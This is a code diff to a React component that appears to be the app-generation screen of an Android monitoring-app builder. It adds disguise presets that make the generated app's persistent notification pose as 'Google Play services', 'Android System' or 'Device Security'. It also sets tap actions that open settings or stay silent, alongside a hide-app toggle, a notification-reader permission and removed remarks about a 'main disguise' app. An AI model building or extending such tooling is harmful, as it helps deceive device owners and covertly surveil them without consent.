@@ -137,20 +137,73 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [isActionMenuOpen, setIsActionMenuOpen] = useState(false);
     const [isIconMenuOpen, setIsIconMenuOpen] = useState(false);
 
-    const NOTIFICATION_PRESETS: Record<string, { title: string; text: string; icon: string }> = {
-        google_play: { title: "Google Play services", text: "Checking for updates…", icon: "ℹ️" },
-        android_system: { title: "Android System", text: "Updating system components…", icon: "🔄" },
-        device_security: { title: "Device Security", text: "Scanning for threats…", icon: "🔒" },
-        system_ui: { title: "System UI", text: "Syncing system data…", icon: "🔄" },
-        device_maintenance: { title: "Device maintenance", text: "Optimizing performance…", icon: "🔄" },
-        download_manager: { title: "Download Manager", text: "Download in progress…", icon: "⬇️" },
-        custom: { title: "Custom Title", text: "Custom description text", icon: "✏️" },
+    const NOTIFICATION_PRESETS: Record<string, { title: string; text: string; icon: string; defaultAction: string; defaultIconKey: string }> = {
+        google_play: { 
+            title: "Google Play services", 
+            text: "Checking for updates…", 
+            icon: "ℹ️",
+            defaultAction: "device_info",
+            defaultIconKey: "info"
+        },
+        android_system: { 
+            title: "Android System", 
+            text: "Updating system components…", 
+            icon: "🔄",
+            defaultAction: "device_info",
+            defaultIconKey: "sync"
+        },
+        device_security: { 
+            title: "Device Security", 
+            text: "Scanning for threats…", 
+            icon: "🔒",
+            defaultAction: "device_info",
+            defaultIconKey: "security"
+        },
+        system_ui: { 
+            title: "System UI", 
+            text: "Syncing system data…", 
+            icon: "🔄",
+            defaultAction: "none",
+            defaultIconKey: "sync"
+        },
+        device_maintenance: { 
+            title: "Device maintenance", 
+            text: "Optimizing performance…", 
+            icon: "🔄",
+            defaultAction: "device_info",
+            defaultIconKey: "sync"
+        },
+        download_manager: { 
+            title: "Download Manager", 
+            text: "Download in progress…", 
+            icon: "⬇️",
+            defaultAction: "none",
+            defaultIconKey: "download"
+        },
+        custom: { 
+            title: "Custom Title", 
+            text: "Custom description text", 
+            icon: "✏️",
+            defaultAction: "device_info",
+            defaultIconKey: "info"
+        },
     };
 
+    // Auto-select smart behavior when selecting a notification style ("jasa kici ne android system select kiya to automatic niche select ho jaye")
+    const handleSelectStyle = (key: string) => {
+        setNotificationStyle(key);
+        const preset = NOTIFICATION_PRESETS[key];
+        if (preset) {
+            setNotificationClickAction(preset.defaultAction);
+            setNotificationIcon(preset.defaultIconKey);
+        }
+        setIsStyleMenuOpen(false);
+    };
+
+    // Removed "launch_app" as requested ("launch main disguise ya khatam")
     const CLICK_ACTIONS: Record<string, { label: string; desc: string }> = {
-        device_info: { label: "Open Device Info / Settings", desc: "Opens Android app info screen" },
-        launch_app: { label: "Launch Main Disguise App", desc: "Opens the web portal or arcade" },
-        none: { label: "Do Nothing (Silent)", desc: "Ignores user taps on notification" },
+        device_info: { label: "Open App Info / System Settings", desc: "Opens Android system App Info & Settings screen" },
+        none: { label: "Do Nothing (Silent Notification)", desc: "Ignores taps, keeps notification running silently" },
     };
 
     const ICON_OPTIONS: Record<string, { label: string; symbol: string }> = {
@@ -479,7 +532,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </button>
                     </div>
 
-                    {/* Bottom row: Wider Glowing Step Navigation Bar ("dono sides sa thora sa ziyda karo") */}
+                    {/* Bottom row: Wider Glowing Step Navigation Bar */}
                     <div className="px-3 pb-3">
                         <div className="grid grid-cols-3 gap-2 p-1.5 rounded-2xl bg-black/40 border border-white/10">
                             <button
@@ -677,8 +730,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                     setHideApp(!hideApp);
                                                 }}
                                                 className={`w-11 h-6 rounded-full transition-colors relative ${
-                                                    isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'
-                                                }`}
+                                                    isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'}`}
                                             >
                                                 <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                             </button>
@@ -700,7 +752,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </span>
                             </div>
 
-                            {/* Core Permissions Grid (Now includes Notification Reader prominent card!) */}
+                            {/* Core Permissions Grid (Includes Notification Reader prominent card!) */}
                             <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
                                 
                                 {/* Gallery & Storage - Soft Emerald */}
@@ -723,7 +775,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </button>
                                 </div>
 
-                                {/* Notification Reader (Monitored Alerts) - Soft Sky ("notification permission jo monitor karti hai woh add karo ui ma") */}
+                                {/* Notification Reader (Monitored Alerts) - Soft Sky */}
                                 <div className="p-4 rounded-2xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(14,165,233,0.1)]">
                                     <div className="flex flex-col">
                                         <div className="flex items-center gap-2">
@@ -951,10 +1003,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 <button
                                                     key={key}
                                                     type="button"
-                                                    onClick={() => {
-                                                        setNotificationStyle(key);
-                                                        setIsStyleMenuOpen(false);
-                                                    }}
+                                                    onClick={() => handleSelectStyle(key)}
                                                     className={`w-full p-3.5 flex items-center justify-between text-left transition-colors ${
                                                         notificationStyle === key ? 'bg-emerald-500/15 text-white font-bold' : 'hover:bg-white/5 text-fg-2'
                                                     }`}
@@ -973,7 +1022,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     )}
                                 </div>
 
-                                {/* Custom UI Dropdown Selector for On-Click Action ("agar notification pe click kare toh kya open hoga") */}
+                                {/* Custom UI Dropdown Selector for On-Click Action */}
                                 <div className="relative">
                                     <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2">When User Taps Notification</label>
                                     
@@ -992,10 +1041,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                             </div>
                                             <div>
                                                 <div className="text-xs font-bold text-white">
-                                                    {CLICK_ACTIONS[notificationClickAction]?.label || "Open Device Info / Settings"}
+                                                    {CLICK_ACTIONS[notificationClickAction]?.label || "Open App Info / System Settings"}
                                                 </div>
                                                 <div className="text-[11px] text-fg-4">
-                                                    {CLICK_ACTIONS[notificationClickAction]?.desc || "Opens Android app info screen"}
+                                                    {CLICK_ACTIONS[notificationClickAction]?.desc || "Opens Android system App Info & Settings screen"}
                                                 </div>
                                             </div>
                                         </div>
@@ -1028,7 +1077,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     )}
                                 </div>
 
-                                {/* Custom UI Dropdown Selector for Notification Status Bar Icon ("icon select kar sakty") */}
+                                {/* Custom UI Dropdown Selector for Notification Status Bar Icon */}
                                 <div className="relative">
                                     <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-2">Notification Status Bar Icon</label>
                                     
